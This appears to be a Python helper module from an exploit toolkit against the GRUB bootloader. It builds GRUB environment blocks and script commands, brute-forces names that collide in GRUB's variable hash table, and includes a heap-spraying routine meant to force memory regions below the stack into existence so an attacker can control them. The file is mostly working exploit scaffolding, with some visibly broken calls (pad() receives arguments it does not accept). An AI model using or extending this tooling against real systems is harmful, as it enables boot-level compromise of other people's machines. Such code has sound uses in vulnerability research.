from consts import HASHSZ, HASHVAL_SPRAY


MAGIC = b'# GRUB Environment Block\n'


def pad(contents, size):
    pre = b'\x00'*(size - len(contents))
    return bytes(contents + pre)


def env_block(vars):
    """
    Contructs an enviroment block.
    """
    res = b''
    res += MAGIC
    for key, value in vars.items():
        res += bytes(f'{key}=', 'ascii') + value
    return pad(res, count=1024, val=b'#', before=False)


def hashval(value):
    i = 0
    for c in value:
        i += 5 * ord(c)
    return i % HASHSZ


def collide_hash(name, target_hashval):
    """
    generate a string with a specific hashvalue.
    """
    for i in range(0, 1024):
        newname = f'{name}_{i:04}'
        if hashval(newname) == target_hashval:
            return newname
    raise Exception('Could not collide hashval????')


def grub_print(msg):
    res = []
    for line in msg.split('\n'):
        res.append(f'echo {msg}')
    return res


def command(cmd):
    return [cmd]


def find_root(path, var):
    return [f'search.file {path} {var}']


class Variable:
    def __init__(self, name, target=None):
        self._name = name if target is None else collide_hash(name, target)

    def __str__(self):
        return f'{self._name}'

    def set(self, value):
        if isinstance(value, bytes):
            return [bytes(f'set {self._name}=', encoding='ascii')+value]
        return [f'set {self._name}={value}']

    def unset(self):
        return [f'unset {self._name}']


def force_regions_to_exist(name='HEAP', expand=8, hashval=HASHVAL_SPRAY):
    """
    Do large allocations, trying to get the region below the stack to exist.
    This puts us in a state of memory pressure, where we need to be careful
    as any large allocations will end up in the region we want to control.
    """
    res = []

    var = Variable(name, hashval)

    res = var.set('${template}${template}'*2)
    for i in range(8):
        val = f'${{{str(var)}}}' * expand
        res += var.set(val)
    res += var.unset()

    return res
